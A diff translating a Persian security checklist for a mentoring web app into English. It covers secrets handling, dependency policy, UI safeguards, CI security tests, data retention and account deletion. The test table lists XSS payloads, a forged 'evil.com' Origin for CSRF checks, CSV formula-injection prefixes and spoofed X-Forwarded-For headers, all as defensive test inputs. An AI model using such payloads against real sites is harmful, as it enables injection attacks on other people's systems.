-- [ ] **SEC-J2** مقایسه‌ی ثابت‌زمان: `timingSafeEqual(sha256(header), sha256(secret))` (هش هر دو تا طول برابر شود). غلط ← `404` (نه `401`) و log هشدار.
-- [ ] **SEC-J3** `:name` از فهرست سفید (`health.sweep`، `auth.cleanup`، `files.cleanup`). بدنه نادیده گرفته شود. محدودیت نرخ ۶۰ در ساعت. این مسیر از بررسی نشست و `Origin` مستثناست، ولی **فقط** این پیشوند دقیق.
-- [ ] **SEC-J4** `/healthz` فقط `{ ok, db: 'ok'|'fail', lastHealthSweepAt, version }`. هیچ پیام خطا یا رشته‌ی اتصالی برنگرداند.
+### 5-12. Internal jobs endpoint (BE)
+- [ ] **SEC-J1** If `JOBS_MODE=http-trigger` and `JOB_TRIGGER_SECRET` is shorter than 32 bytes (or empty), the application must **not start**. In every other case, `/api/internal/**` returns `404` regardless of the header.
+- [ ] **SEC-J2** Constant-time comparison: `timingSafeEqual(sha256(header), sha256(secret))` (hash both to equal length). A mismatch ← `404` (not `401`) and a warning log.
+- [ ] **SEC-J3** `:name` from a whitelist (`health.sweep`, `auth.cleanup`, `files.cleanup`). The body is ignored. Rate limit of 60 per hour. This path is exempt from the session and `Origin` check, but **only** this exact prefix.
+- [ ] **SEC-J4** `/healthz` returns only `{ ok, db: 'ok'|'fail', lastHealthSweepAt, version }`. It must not return any error message or connection string.
 
-### ۵-۱۳. اسرار و پیکربندی (DO، BE)
-- [ ] **SEC-K1** فهرست اسرار 0.1: `DATABASE_URL`، اعتبارنامه‌ی ذخیره‌سازی، `DEVICE_COOKIE_SECRET` (۳۲ بایت تصادفی)، `JOB_TRIGGER_SECRET` (فقط اگر http-trigger)، کلید عمومی `age` (راز نیست ولی ثابت است). همه در App Settings و GitHub Secrets؛ **هیچ‌کدام در مخزن، image یا لاگ build**. `.env*` در `.gitignore` باشد، به‌جز `.env.example` بدون مقدار. اسکن اسرار (gitleaks) در CI.
-- [ ] **SEC-K2** (C8) دیتابیس: **«Allow public access from any Azure service» خاموش**. یا VNet integration و دسترسی خصوصی (اگر پلن B1 پشتیبانی کند و هزینه‌ی DNS خصوصی پذیرفتنی باشد)، یا قاعده‌ی فایروال فقط برای IPهای خروجی App Service (`possibleOutboundIpAddresses`). اتصال با `sslmode=verify-full`. نقش دیتابیس برنامه superuser نباشد. توصیه: نقش جدا برای مهاجرت (DDL) و نقش runtime فقط DML، و نقش runtime روی `audit_log` فقط `INSERT` و `SELECT` داشته باشد.
-- [ ] **SEC-K3** Blob: کانتینر با `public access = none`. اعتبارنامه‌ی برنامه فقط به کانتینر پیوست‌ها دسترسی داشته باشد (Managed Identity با نقش `Storage Blob Data Contributor` روی همان کانتینر، یا SAS محدود به کانتینر). کلید کامل حساب ذخیره‌سازی در تنظیمات برنامه نباشد.
-- [ ] **SEC-K4** (C8) پشتیبان‌ها در **حساب ذخیره‌سازی جدا** با سیاست immutability یا soft delete ۱۴ روزه. برنامه هیچ اعتبارنامه‌ای برای آن ندارد. مقصد داخل ایران فقط SAS **خواندنی** با انقضای حداکثر ۹۰ روز دارد و چرخش آن در runbook آمده است.
-- [ ] **SEC-K5** کلید **خصوصی** `age` بیرون از Azure و GitHub است (نزد بنیان‌گذار، با یک نسخه‌ی آفلاین). بدون آن پشتیبان قابل‌بازیابی نیست. پس محل دوم نگه‌داری کلید در runbook مشخص شود.
-- [ ] **SEC-K6** App Service: «HTTPS Only» روشن، حداقل TLS 1.2، FTP و SCM basic auth خاموش، remote debugging خاموش. استقرار از GitHub Actions با OIDC (federated credential)، نه publish profile. GHCR خصوصی.
-- [ ] **SEC-K7** چرخش: هر راز در صورت نشت فوراً، و `DEVICE_COOKIE_SECRET` و رمز دیتابیس سالی یک بار. چرخش `DEVICE_COOKIE_SECRET` فقط کوکی‌های دستگاه را بی‌اعتبار می‌کند (اثرش این است که قفل سراسری موبایل یک بار شامل همه می‌شود).
+### 5-13. Secrets and configuration (DO, BE)
+- [ ] **SEC-K1** The 0.1 secrets list: `DATABASE_URL`, the storage credential, `DEVICE_COOKIE_SECRET` (32 random bytes), `JOB_TRIGGER_SECRET` (only if http-trigger), the `age` public key (not a secret but fixed). All in App Settings and GitHub Secrets; **none in the repository, the image or the build log**. `.env*` is in `.gitignore`, except `.env.example` without values. Secret scanning (gitleaks) in CI.
+- [ ] **SEC-K2** (C8) Database: **"Allow public access from any Azure service" off**. Either VNet integration and private access (if the B1 plan supports it and the private DNS cost is acceptable), or a firewall rule only for App Service's outbound IPs (`possibleOutboundIpAddresses`). Connect with `sslmode=verify-full`. The application's database role must not be a superuser. Recommended: a separate role for migrations (DDL) and a runtime role with DML only, and the runtime role has only `INSERT` and `SELECT` on `audit_log`.
+- [ ] **SEC-K3** Blob: container with `public access = none`. The application's credential has access only to the attachments container (a Managed Identity with the `Storage Blob Data Contributor` role on that container, or a container-scoped SAS). The full storage account key must not be in the app settings.
+- [ ] **SEC-K4** (C8) Backups in a **separate storage account** with an immutability policy or 14-day soft delete. The application has no credential for it. The destination inside Iran has only a **read-only** SAS with an expiry of at most 90 days, and its rotation is in the runbook.
+- [ ] **SEC-K5** The `age` **private** key is outside Azure and GitHub (with the founder, with an offline copy). Without it the backup cannot be restored. So a second place to keep the key must be specified in the runbook.
+- [ ] **SEC-K6** App Service: "HTTPS Only" on, minimum TLS 1.2, FTP and SCM basic auth off, remote debugging off. Deploy from GitHub Actions with OIDC (federated credential), not a publish profile. Private GHCR.
+- [ ] **SEC-K7** Rotation: any secret immediately upon a leak, and `DEVICE_COOKIE_SECRET` and the database password once a year. Rotating `DEVICE_COOKIE_SECRET` only invalidates the device cookies (its effect is that the global mobile lockout applies to everyone once).
 
-### ۵-۱۴. وابستگی‌ها (DO، BE)
-- [ ] **SEC-D1** Dependabot یا Renovate هفتگی؛ به‌روزرسانی‌های امنیتی Next.js، React، sharp و `@node-rs/argon2` در ۷۲ ساعت.
-- [ ] **SEC-D2** `pnpm audit --prod --audit-level=high` در CI **مانع merge**. استثنا فقط با یادداشت تاریخ‌دار در یک فایل مشخص.
-- [ ] **SEC-D3** `pnpm install --frozen-lockfile`. اسکریپت‌های نصب فقط برای بسته‌های فهرست‌شده (`onlyBuiltDependencies` در pnpm).
-- [ ] **SEC-D4** image پایه‌ی کوچک (مثلاً `node:24-slim` یا distroless)، کاربر غیر root، اسکن image (Trivy) در CI با شکست روی critical.
+### 5-14. Dependencies (DO, BE)
+- [ ] **SEC-D1** Dependabot or Renovate weekly; security updates for Next.js, React, sharp and `@node-rs/argon2` within 72 hours.
+- [ ] **SEC-D2** `pnpm audit --prod --audit-level=high` in CI **blocks merge**. Exceptions only with a dated note in a designated file.
+- [ ] **SEC-D3** `pnpm install --frozen-lockfile`. Install scripts only for the listed packages (`onlyBuiltDependencies` in pnpm).
+- [ ] **SEC-D4** A small base image (for example `node:24-slim` or distroless), a non-root user, image scanning (Trivy) in CI that fails on critical.
 
-### ۵-۱۵. محیط توسعه‌ی محلی (همه)
-- [ ] **SEC-E1** Postgres جاسازی‌شده فقط روی `127.0.0.1` گوش بدهد، با رمز dev جدا که در هیچ محیط دیگری استفاده نمی‌شود.
-- [ ] **SEC-E2** **داده‌ی تولید هرگز روی دستگاه توسعه نمی‌آید.** seed و fixtureها ساختگی‌اند (موبایل‌های `+98900000xxxx`). اگر برای اشکال‌زدایی داده‌ی واقعی لازم شد، فقط پس از ناشناس‌سازی با همان فرایند حذف (بخش ۷).
-- [ ] **SEC-E3** seedهای تولید هیچ کاربر یا رمز پیش‌فرض ندارند. اولین مدیر فقط با CLI (SEC-T6).
+### 5-15. Local development environment (everyone)
+- [ ] **SEC-E1** The embedded Postgres listens only on `127.0.0.1`, with a separate dev password that is not used in any other environment.
+- [ ] **SEC-E2** **Production data never comes to the development machine.** Seeds and fixtures are fake (mobile numbers `+98900000xxxx`). If real data is needed for debugging, only after anonymization with the same deletion process (section 7).
+- [ ] **SEC-E3** Production seeds have no default user or password. The first admin only via the CLI (SEC-T6).
 
-### ۵-۱۶. رابط کاربری (FE)
-- [ ] **SEC-F1** فرم ورود: `autocomplete="username"` برای موبایل (`inputmode="tel"`) و `current-password`؛ فرم تعیین رمز `new-password` تا مدیر رمز مرورگر کار کند.
-- [ ] **SEC-F2** پیام خطای ورود همیشه یکی: «موبایل یا رمز درست نیست». پیام قفل: «تلاش‌ها زیاد بود؛ X دقیقه‌ی دیگر دوباره امتحان کن».
-- [ ] **SEC-F3** صفحه‌ی «دستگاه‌های من» با «خروج از همه‌ی دستگاه‌های دیگر».
-- [ ] **SEC-F4** صفحه‌ی پذیرش دعوت یک خط درباره‌ی محل نگه‌داری داده داشته باشد (بخش ۸) و لینک یک صفحه‌ی کوتاه حریم خصوصی.
-- [ ] **SEC-F5** خروج: پس از پاسخ، `location.replace('/login')` تا دکمه‌ی back صفحه‌ی قبل را نشان ندهد.
-- [ ] **SEC-F6** برچسب «هنرجو این را می‌بیند» کنار `platform_profiles.notes`، شرح کار، بازخورد و یادداشت اشتراکی. تغییر یادداشت از داخلی به اشتراکی پنجره‌ی تأیید دارد.
-- [ ] **SEC-F7** کنار آپلود مدرک قرارداد: «نام و عکس کارفرما و شناسه‌ی قرارداد را بپوشان».
-- [ ] **SEC-F8** فیلدهای پروفایل پلتفرم هشدار «رمز یا ایمیل ورود اکانتت را اینجا ننویس» داشته باشند (PRD بخش ۶).
-
----
-
-## ۶. تست‌های امنیتی که باید در CI باشند (مانع merge)
-
-همه روی Postgres واقعی ۱۶ (Testcontainers یا service container در GitHub Actions). محلی روی Postgres جاسازی‌شده.
-
-| کد | تست | جزئیات |
-|---|---|---|
-| **T-MATRIX** | ماتریس دسترسی | همه‌ی endpointهای `routes.manifest.ts` × نقش‌ها: **A**، **M-مالک**، **M-غیرمالک**، **M-سابق** (پس از تغییر مشاور)، **M-assignee** (مسئول سؤال خارج از دامنه)، **S-مالک**، **S-دیگر**، **بی‌نشست**، **کاربر غیرفعال با کوکی قدیمی**، **کاربر `invited`**. کد وضعیت مورد انتظار در manifest است. endpoint ثبت‌نشده ← شکست. برای منابع تکی، شناسه‌ی منبع هنرجوی دیگر و شناسه‌ی ناموجود هر دو باید **یک** پاسخ (`404` با همان بدنه) بدهند |
-| **T-REF** | شناسه‌های ارجاعی (C3) | برای هر ردیف جدول C3 یک مورد منفی: `profileId` هنرجوی دیگر، `taskId` هنرجوی دیگر، `attachmentIds` کاربر دیگر یا `linked`، `mentorId`/`reviewerId`/`assigneeId` = شناسه‌ی هنرجو، `studentIds` bulk با یک عضو خارج از دامنه (کل درخواست رد و **هیچ** کاری ساخته نشود) |
-| **T-ESC** | ارتقای دسترسی | مشاور برای کاربر `invited` با نقش `admin` و `mentor` لینک دعوت می‌خواهد ← `404`. مشاور `PATCH /users/:id/role` ← `403`. هنرجو `PATCH /me/student {primaryMentorId}` ← `422`. هنرجو `POST /me/milestones {status:'approved'}` ← `422` |
-| **T-CANARY** | قناری (توسعه‌ی ADR-0004) | علاوه بر `CANARY-…` در یادداشت داخلی، پرچم و دلیل سلامت: رشته‌های `$argon2id$`، هش توکن نشست، موبایل مشاور، و `reviewerId` نباید در **هیچ** پاسخ GET هنرجو و هیچ HTML صفحه‌ی هنرجو (شامل payload RSC) باشند |
-| **T-DTO** | DTO سخت‌گیر | هر پاسخ مسیرهای قابل‌دسترس هنرجو با schema zod `.strict()` همان DTO parse شود. فیلد اضافه ← شکست |
-| **T-AUTH** | احراز هویت | قفل دقیقاً پس از ۵ شکست (`pi`)؛ قفل `p` پس از ۲۰ شکست، و عبور با کوکی دستگاه معتبر؛ `429` یکسان برای موبایل ناموجود؛ هش ساختگی برای کاربر ناموجود صدا زده می‌شود (spy، نه زمان‌سنجی)؛ `X-Forwarded-For` جعلی در سمت چپ قفل IP را دور نمی‌زند |
-| **T-TOKEN** | توکن | یک‌بارمصرف (دو پذیرش هم‌زمان ← فقط یکی موفق)؛ منقضی ← `410`؛ ساخت دوباره قبلی را باطل می‌کند؛ موبایل غلط ۵ بار ← توکن باطل؛ هیچ مسیری با `:token` در manifest نیست |
-| **T-SESSION** | نشست | ویژگی‌های کوکی (`HttpOnly`، `Secure`، `SameSite=Lax`، `Path=/`، بدون `Domain`)؛ ابطال پس از تغییر رمز، بازنشانی، غیرفعال‌سازی، تغییر نقش و تغییر موبایل؛ چرخش نشست جاری پس از تغییر رمز؛ سقف مطلق (با ساعت ساختگی)؛ عمر کوتاه‌تر کارکنان |
-| **T-CSRF** | CSRF | برای **همه‌ی** endpointهای غیر GET در manifest: بدون `Origin` ← `403`؛ `Origin` دیگر (از جمله `https://app.example.ir.evil.com` و `http://` همان دامنه) ← `403`؛ `Content-Type: text/plain` ← `415` |
-| **T-HDR** | هدرها | CSP (بدون هیچ منبع خارجی؛ تست رشته‌ای `https:` نباید در `script-src`/`connect-src`/`font-src` باشد)، HSTS، `nosniff`، `Referrer-Policy`، `frame-ancestors`، نبود `X-Powered-By`؛ روی یک صفحه‌ی HTML، یک پاسخ API و یک پیوست |
-| **T-CSP-E2E** | Playwright | در همه‌ی سناریوهای e2e، رخداد `securitypolicyviolation` و درخواست به دامنه‌ای جز `APP_BASE_URL` ← شکست. کش service worker فقط `/_next/static` |
-| **T-XSS** | Playwright | payloadهای `<img src=x onerror=…>`، `"><svg onload=…>`، `</script>` و لینک `javascript:` در همه‌ی فیلدهای آزاد هنرجو (بخش ۳-۵)؛ مشاور صفحه‌های پرونده، کار، سؤال و «امروز» را باز می‌کند؛ هیچ `dialog` باز نشود. API لینک `javascript:` و `data:` را `422` بدهد |
-| **T-UPLOAD** | آپلود | HTML با `Content-Type: image/png` ← `415`؛ SVG ← `415`؛ ۶ مگابایت ← `413` بدون بافر کامل؛ PNG با ابعاد بیش از ۴۰ مگاپیکسل ← `422`؛ JPEG با GPS ← خروجی بدون EXIF؛ وصل کردن پیوست کاربر دیگر ← `422` |
-| **T-CSV** | CSV | خروجی سلول‌های شروع‌شده با `= + - @ \t \r ＝` را با `'` خنثی کرده است؛ ستون یادداشت داخلی در خروجی نیست؛ ورود XLSX ← `415` (C6) |
-| **T-LOG** | لاگ | لاگ‌های یک جریان کامل (دعوت ← پذیرش ← ورود ناموفق ← ورود ← جستجو با موبایل ← آپلود ← خروجی CSV) جمع می‌شوند و نباید شامل الگوی موبایل کامل، توکن دعوت، مقدار کوکی، `$argon2id$` یا `X-Job-Secret` باشند |
-| **T-JOBS** | endpoint داخلی | با `JOBS_MODE=in-process` ← `404` حتی با secret درست؛ با `http-trigger` و secret غلط ← `404`؛ شروع برنامه با secret کوتاه ← خطا؛ نام خارج از فهرست ← `404` |
-| **T-STATIC** | بررسی ایستا | Biome: `noDangerouslySetInnerHtml` و `noRestrictedImports` (ماژول‌های `health` و `notes.internal` در `app/(student)` و `api/v1/me`)؛ جستجوی `"use server"`؛ gitleaks؛ `pnpm audit`؛ Trivy روی image |
+### 5-16. User interface (FE)
+- [ ] **SEC-F1** Login form: `autocomplete="username"` for the mobile number (`inputmode="tel"`) and `current-password`; the set-password form uses `new-password` so the browser's password manager works.
+- [ ] **SEC-F2** The login error message is always the same: "Mobile or password is incorrect" (Persian original: «موبایل یا رمز درست نیست»). Lockout message: "Too many attempts; try again in X minutes" (Persian original: «تلاش‌ها زیاد بود؛ X دقیقه‌ی دیگر دوباره امتحان کن»).
+- [ ] **SEC-F3** A "My devices" page with "Sign out of all other devices".
+- [ ] **SEC-F4** The invite acceptance page has one line about where data is kept (section 8) and a link to a short privacy page.
+- [ ] **SEC-F5** Logout: after the response, `location.replace('/login')` so the back button does not show the previous page.
+- [ ] **SEC-F6** A "the student sees this" label next to `platform_profiles.notes`, the task description, feedback and the shared note. Changing a note from internal to shared has a confirmation dialog.
+- [ ] **SEC-F7** Next to the contract evidence upload: "Cover the client's name and photo and the contract ID."
+- [ ] **SEC-F8** Platform profile fields must carry the warning "Do not write your account's login password or email here" (PRD section 6).
 
 ---
 
-## ۷. داده‌های حساس: نگه‌داری و حذف حساب
+## 6. Security tests that must be in CI (merge blockers)
 
-### ۷-۱. سیاست نگه‌داری (پیشنهاد؛ منتظر تأیید بنیان‌گذار)
-| داده | مدت نگه‌داری | سازوکار |
+All run on a real Postgres 16 (Testcontainers or a service container in GitHub Actions). Locally on the embedded Postgres.
+
+| Code | Test | Details |
 |---|---|---|
-| `sessions` (با IP و User-Agent) | تا انقضا یا ابطال + ۷ روز | `auth.cleanup` (موجود) |
-| `auth_tokens` | تا انقضا یا مصرف + ۷ روز | `auth.cleanup` (موجود) |
-| `auth_throttle` | تا پایان پنجره یا قفل | `auth.cleanup` (موجود) |
-| پیوست `pending` | ۲۴ ساعت | `files.cleanup` (موجود) |
-| لاگ برنامه | ۳۰ روز | تنظیم میزبان (DO) |
-| لاگ HTTP میزبان | خاموش یا ۷ روز | تنظیم میزبان (DO) |
-| `audit_log` | ۲۴ ماه؛ ستون `ip` پس از ۹۰ روز `null` | job ماهانه‌ی تازه `audit.cleanup` |
-| پشتیبان روزانه | ۱۴ روز روزانه + ۸ هفته هفتگی (هر دو مقصد) | DO، ADR-0002 بخش ۶ |
-| داده‌ی هنرجوی `graduated` یا `dropped` | تا وقتی رابطه‌ی آموزشی هست؛ پس از ۲۴ ماه بی‌فعالیتی، مدیر برای حذف بازبینی می‌کند | فهرست در تنظیمات مدیر (1.0) یا پرس‌وجوی دستی در 0.1 |
-| `submissions` با `ai_use_consent = true` | تا لغو رضایت یا حذف حساب | 1.0 باید «لغو رضایت» را پیش از هر استفاده بدهد |
-| فایل‌های CSV خروجی | بیرون از سیستم؛ مسئولیت مدیر | هشدار SEC-V3 |
+| **T-MATRIX** | Access matrix | All endpoints in `routes.manifest.ts` × roles: **A**, **M-owner**, **M-non-owner**, **former-M** (after a mentor change), **M-assignee** (responsible for a question outside their scope), **S-owner**, **S-other**, **no session**, **deactivated user with an old cookie**, **`invited` user**. The expected status code is in the manifest. An unregistered endpoint ← failure. For single resources, another student's resource ID and a non-existent ID must both give the **same** response (`404` with the same body) |
+| **T-REF** | Referenced IDs (C3) | One negative case for every row of the C3 table: another student's `profileId`, another student's `taskId`, `attachmentIds` of another user or already `linked`, `mentorId`/`reviewerId`/`assigneeId` = a student's ID, bulk `studentIds` with one out-of-scope member (the whole request is rejected and **nothing** is created) |
+| **T-ESC** | Privilege escalation | A mentor asks for an invite link for an `invited` user with the `admin` and `mentor` roles ← `404`. A mentor `PATCH /users/:id/role` ← `403`. A student `PATCH /me/student {primaryMentorId}` ← `422`. A student `POST /me/milestones {status:'approved'}` ← `422` |
+| **T-CANARY** | Canary (extension of ADR-0004) | In addition to `CANARY-…` in the internal note, flag and health reason: the strings `$argon2id$`, the session token hash, the mentor's mobile number, and `reviewerId` must not be in **any** student GET response or any student page HTML (including the RSC payload) |
+| **T-DTO** | Strict DTO | Every response of student-accessible paths is parsed with the zod `.strict()` schema of that DTO. An extra field ← failure |
+| **T-AUTH** | Authentication | Lockout exactly after 5 failures (`pi`); the `p` lockout after 20 failures, and passing with a valid device cookie; identical `429` for a non-existent mobile number; the dummy hash is called for a non-existent user (a spy, not timing); a forged `X-Forwarded-For` on the left does not bypass the IP lockout |
+| **T-TOKEN** | Token | Single use (two concurrent acceptances ← only one succeeds); expired ← `410`; re-creation invalidates the previous one; a wrong mobile number 5 times ← token invalidated; no path with `:token` in the manifest |
+| **T-SESSION** | Session | Cookie attributes (`HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, no `Domain`); revocation after password change, reset, deactivation, role change and mobile change; rotation of the current session after a password change; the absolute cap (with a fake clock); the shorter staff lifetime |
+| **T-CSRF** | CSRF | For **all** non-GET endpoints in the manifest: no `Origin` ← `403`; another `Origin` (including `https://app.example.ir.evil.com` and `http://` on the same domain) ← `403`; `Content-Type: text/plain` ← `415` |
+| **T-HDR** | Headers | CSP (no external resource; a string test that `https:` must not be in `script-src`/`connect-src`/`font-src`), HSTS, `nosniff`, `Referrer-Policy`, `frame-ancestors`, no `X-Powered-By`; on one HTML page, one API response and one attachment |
+| **T-CSP-E2E** | Playwright | In all e2e scenarios, a `securitypolicyviolation` event and a request to a domain other than `APP_BASE_URL` ← failure. The service worker cache holds only `/_next/static` |
+| **T-XSS** | Playwright | Payloads `<img src=x onerror=…>`, `"><svg onload=…>`, `</script>` and a `javascript:` link in all the student's free-text fields (section 3-5); the mentor opens the profile, task, question and "Today" pages; no `dialog` may open. The API returns `422` for `javascript:` and `data:` links |
+| **T-UPLOAD** | Upload | HTML with `Content-Type: image/png` ← `415`; SVG ← `415`; 6 MB ← `413` without full buffering; a PNG with dimensions over 40 megapixels ← `422`; a JPEG with GPS ← output without EXIF; linking another user's attachment ← `422` |
+| **T-CSV** | CSV | Output neutralizes cells starting with `= + - @ \t \r ＝` with `'`; the internal-note column is not in the output; XLSX import ← `415` (C6) |
+| **T-LOG** | Log | The logs of a complete flow (invite ← acceptance ← failed login ← login ← search by mobile number ← upload ← CSV export) are collected and must not contain a full mobile number pattern, an invite token, a cookie value, `$argon2id$` or `X-Job-Secret` |
+| **T-JOBS** | Internal endpoint | With `JOBS_MODE=in-process` ← `404` even with the correct secret; with `http-trigger` and a wrong secret ← `404`; application start with a short secret ← error; a name outside the list ← `404` |
+| **T-STATIC** | Static checks | Biome: `noDangerouslySetInnerHtml` and `noRestrictedImports` (the `health` and `notes.internal` modules in `app/(student)` and `api/v1/me`); search for `"use server"`; gitleaks; `pnpm audit`; Trivy on the image |
 
-### ۷-۲. حذف حساب در 0.1 (C5)
-**درخواست:** کاربر به مربی پیام می‌دهد (S10 راهنمایی می‌کند). مدیر حداکثر ظرف ۳۰ روز اجرا می‌کند.
-**اجرا:** `pnpm admin:erase-user --id <uuid> --confirm "<displayName>"` (CLI، نه endpoint، تا یک عمل ویرانگر از راه وب در دسترس نباشد)، در یک تراکنش:
+---
 
-| جدول | عمل |
+## 7. Sensitive data: retention and account deletion
+
+### 7-1. Retention policy (proposal; awaiting founder approval)
+| Data | Retention period | Mechanism |
+|---|---|---|
+| `sessions` (with IP and User-Agent) | Until expiry or revocation + 7 days | `auth.cleanup` (existing) |
+| `auth_tokens` | Until expiry or use + 7 days | `auth.cleanup` (existing) |
+| `auth_throttle` | Until the end of the window or lockout | `auth.cleanup` (existing) |
+| `pending` attachment | 24 hours | `files.cleanup` (existing) |
+| Application log | 30 days | Host setting (DO) |
+| Host HTTP log | Off or 7 days | Host setting (DO) |
+| `audit_log` | 24 months; the `ip` column becomes `null` after 90 days | New monthly job `audit.cleanup` |
+| Daily backup | 14 days daily + 8 weeks weekly (both destinations) | DO, ADR-0002 section 6 |
+| Data of a `graduated` or `dropped` student | As long as the training relationship exists; after 24 months of inactivity, the admin reviews it for deletion | A list in the admin settings (1.0) or a manual query in 0.1 |
+| `submissions` with `ai_use_consent = true` | Until consent is withdrawn or the account is deleted | 1.0 must provide "withdraw consent" before any use |
+| Exported CSV files | Outside the system; the admin's responsibility | Warning SEC-V3 |
+
+### 7-2. Account deletion in 0.1 (C5)
+**Request:** the user messages the coach (S10 gives the guidance). The admin carries it out within 30 days at most.
+**Execution:** `pnpm admin:erase-user --id <uuid> --confirm "<displayName>"` (a CLI, not an endpoint, so that a destructive action is not available over the web), in one transaction:
+
+| Table | Action |
 |---|---|
-| `users` | `display_name = 'کاربر حذف‌شده'`، `phone = 'erased:' + id` (یکتا می‌ماند)، `password_hash = null`، `status = 'disabled'`، `erased_at = now()` |
-| `sessions`، `auth_tokens`، `auth_throttle` (کلیدهای آن موبایل) | حذف |
-| `students` | فیلدهای شخصی (`messenger_handle`، `primary_skill`، `goal_90d`، `self_reported_blocker`، `niche_statement`، `income_goal_usd`، `tags`، `cohort`، `status_reason`) ← `null` یا خالی؛ `search_text` بازسازی؛ `lifecycle_status = 'dropped'` |
-| `platform_profiles`، `profile_snapshots` | **حذف کامل** (لینک پروفایل ح۳ است) |
-| `submissions` | `body_text`، `links`، `job_post_text`، `proposal_text`، `profile_text` ← `null`؛ `ai_use_consent = false` |
-| `question_messages` نوشته‌ی کاربر، `checkins` | متن‌ها ← `'[حذف شد]'` |
-| `notes` درباره‌ی هنرجو، `student_flags` | حذف کامل |
-| `milestones` | `evidence_text` و `amount` ← `null`. نوع و تاریخ می‌مانند (آمار North Star بی‌نام حفظ می‌شود) |
-| `attachments` (همه‌ی والدهای این هنرجو) | حذف فایل از storage و ردیف |
-| `timeline_events` | `data` رویدادهای `student.updated` و `profile.*` ← `{}` |
-| `audit_log` | ردیف‌ها می‌مانند؛ هر موبایل در `data` ماسک شود؛ یک ردیف `user.erased` (فقط با `target_id`) اضافه شود |
+| `users` | `display_name = 'کاربر حذف‌شده'` ("Deleted user"), `phone = 'erased:' + id` (stays unique), `password_hash = null`, `status = 'disabled'`, `erased_at = now()` |
+| `sessions`, `auth_tokens`, `auth_throttle` (that mobile number's keys) | Delete |
+| `students` | Personal fields (`messenger_handle`, `primary_skill`, `goal_90d`, `self_reported_blocker`, `niche_statement`, `income_goal_usd`, `tags`, `cohort`, `status_reason`) ← `null` or empty; rebuild `search_text`; `lifecycle_status = 'dropped'` |
+| `platform_profiles`, `profile_snapshots` | **Delete completely** (the profile link is Class 3) |
+| `submissions` | `body_text`, `links`, `job_post_text`, `proposal_text`, `profile_text` ← `null`; `ai_use_consent = false` |
+| `question_messages` written by the user, `checkins` | Texts ← `'[حذف شد]'` ("[Deleted]") |
+| `notes` about the student, `student_flags` | Delete completely |
+| `milestones` | `evidence_text` and `amount` ← `null`. The type and date stay (the anonymous North Star statistics are preserved) |
+| `attachments` (all of this student's parents) | Delete the file from storage and the row |
+| `timeline_events` | `data` of `student.updated` and `profile.*` events ← `{}` |
+| `audit_log` | Rows stay; every mobile number in `data` is masked; one `user.erased` row (with only `target_id`) is added |
 
-- **کارکنان:** حذف مشاور یا مدیر همان ستون‌های `users` را پاک می‌کند. یادداشت‌ها و بازخوردهایش برای پرونده‌ی هنرجو می‌مانند و نویسنده «مشاور سابق» نمایش داده می‌شود.
-- **پشتیبان‌ها:** داده‌ی حذف‌شده تا پایان دوره‌ی نگه‌داری پشتیبان (حداکثر ۸ هفته) در پشتیبان‌ها می‌ماند. این در صفحه‌ی حریم خصوصی گفته شود. **runbook بازیابی** باید پس از هر restore، فرمان حذف را برای همه‌ی `target_id`های `user.erased` در `audit_log` دوباره اجرا کند (پس `audit_log` منبع «فهرست حذف‌ها» است و خودش نباید از پشتیبان قدیمی‌تر بازیابی شود بدون این مرحله).
-- **غیرفعال‌سازی** (`disabled`) حذف نیست. فقط ورود را می‌بندد.
-
----
-
-## ۸. میزبانی و حاکمیت داده (بازبینی H5 و H7 در ADR-0002)
-
-- **H5 (شرایط ارائه‌دهنده و تحریم):** از نظر امنیتی، پیامد اصلی **تعلیق بی‌هشدار حساب** است، یعنی از دست رفتن هم‌زمان برنامه، دیتابیس و پشتیبان‌های Azure. کنترل لازم همان پشتیبان رمزشده‌ی بیرون از Azure است (SEC-K4، SEC-K5)، و این‌که **کلید `age` و دسترسی ثبت‌کننده‌ی دامنه (DNS)** بیرون از همان حساب باشند تا انتقال ممکن بماند. این بازبینی راهی برای دور زدن شرایط ارائه‌دهنده پیشنهاد نمی‌کند. سؤال Q1 فقط با بنیان‌گذار است.
-- **H7 (قانون داخلی درباره‌ی نگهداری داده در خارج):** بررسی حقوقی در توان این نقش نیست و **تأیید نشد**. کاهش ریسک از سمت ما: حداقل‌سازی داده (بدون کد ملی، بدون آدرس، بدون ایمیل، بدون رمز اکانت پلتفرم)، شفافیت با کاربر (SEC-F4: «داده‌ی تو روی سروری بیرون از ایران نگه‌داری می‌شود و نسخه‌ی پشتیبان رمزشده داخل ایران هم داریم»)، و سیاست حذف (بخش ۷).
-- **مقصد پشتیبان داخل ایران:** فایل‌ها رمزشده‌اند و کلید خصوصی آنجا نیست. پس ارائه‌دهنده‌ی داخلی محتوا را نمی‌بیند. در **مهاجرت اضطراری** کلید باید روی سرور ایرانی بیاید و از آن لحظه همه‌ی کنترل‌های این سند (هدرها، TLS، فایروال دیتابیس، لاگ) باید روی میزبان تازه هم برقرار باشند. چک‌لیست runbook انتقال (DO) به بخش ۵ همین سند ارجاع دهد.
+- **Staff:** deleting a mentor or admin clears the same `users` columns. Their notes and feedback stay for the student's record, and the author is displayed as "Former mentor".
+- **Backups:** deleted data stays in the backups until the end of the backup retention period (8 weeks at most). This must be stated on the privacy page. The **restore runbook** must, after every restore, re-run the delete command for all `target_id`s of `user.erased` in `audit_log` (so `audit_log` is the source of the "deletion list" and itself must not be restored from an older backup without this step).
+- **Deactivation** (`disabled`) is not deletion. It only blocks login.
 
 ---
 
-## ۹. بیرون از 0.1 (برای ADRهای 1.0)
-- **ورود دومرحله‌ای مدیر:** TOTP (اپ authenticator، بدون وابستگی به پیامک) **پیش از دعوت دومین مدیر یا رسیدن به بیش از ۱۵۰ هنرجو**، هر کدام زودتر بود.
-- **RLS** روی `notes`، `student_flags` و `student_health` همراه با ماژول AI (ADR-0004 هم همین را گفته است).
-- **OTP پیامکی (F16):** محدودیت نرخ ارسال به ازای موبایل و IP، طول عمر ۲ دقیقه، حداکثر ۵ تلاش، و ریسک SIM swap برای حساب کارکنان (OTP به‌تنهایی برای کارکنان کافی نیست).
-- **ابزارهای AI:** متن آگهی و پروپوزال ورودی **نامطمئن** است (prompt injection)، پرامپت سیستم را نشت ندهد، سهمیه‌ی هزینه پیش از فراخوانی (F17)، حذف نام کارفرما و هنرجو پیش از ارسال به ارائه‌دهنده، و احترام به `ai_use_consent` و لغو آن.
-- **پرداخت:** تأیید مبلغ و وضعیت از سمت سرور با API درگاه (نه callback)، idempotency، رله‌ی داخلی callback اگر سرور خارج است. در ADR ماژول `billing`.
+## 8. Hosting and data governance (review of H5 and H7 in ADR-0002)
 
